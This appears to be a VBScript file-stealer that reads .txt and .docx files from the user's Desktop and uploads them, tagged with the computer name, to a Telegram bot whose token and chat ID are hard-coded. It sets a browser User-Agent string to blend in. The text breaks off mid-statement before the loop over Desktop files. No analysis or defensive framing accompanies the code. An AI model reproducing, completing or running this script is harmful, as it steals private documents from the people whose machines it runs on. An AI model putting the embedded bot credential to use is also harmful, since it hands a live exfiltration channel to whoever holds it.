Dim WshShell, objFSO, botToken, chatId, computerId
Set WshShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

botToken = "8711318219:AAFj7ddap7JMNibxMSwIDBcBd8IS36jm6NA"
chatId   = "8221773638"

computerId = WshShell.ExpandEnvironmentStrings("%COMPUTERNAME%")

Dim desktopPath
desktopPath = WshShell.SpecialFolders("Desktop")

Sub SendFileToTelegram(filePath)
    If Not objFSO.FileExists(filePath) Then Exit Sub
    
    Dim fileName, ext, http, boundary, bodyStart, bodyEnd, fileContent
    fileName = objFSO.GetFileName(filePath)
    ext = LCase(objFSO.GetExtensionName(fileName))
    
    If ext <> "txt" And ext <> "docx" Then Exit Sub
    
    boundary = "------------------------" & WScript.CreateObject("Scripting.FileSystemObject").GetTempName
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.LoadFromFile filePath
    fileContent = stream.Read
    stream.Close
    
    bodyStart = "--" & boundary & vbCrLf & _
                "Content-Disposition: form-data; name=""chat_id""" & vbCrLf & vbCrLf & _
                chatId & vbCrLf & _
                "--" & boundary & vbCrLf & _
                "Content-Disposition: form-data; name=""caption""" & vbCrLf & vbCrLf & _
                "Desktop file from " & computerId & vbCrLf & _
                "--" & boundary & vbCrLf & _
                "Content-Disposition: form-data; name=""document""; filename=""" & fileName & """" & vbCrLf & _
                "Content-Type: application/octet-stream" & vbCrLf & vbCrLf
    
    bodyEnd = vbCrLf & "--" & boundary & "--"
    
    Dim fullBody
    fullBody = bodyStart & fileContent & bodyEnd
    
    Dim apiUrl
    apiUrl = "https://api.telegram.org/bot" & botToken & "/sendDocument"
    
    http.Open "POST", apiUrl, False
    http.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
    http.setRequestHeader "User-Agent", "Mozilla/5.0"
    http.Send fullBody
End Sub

Dim folder, file
Set folder = objFSO.GetFolder
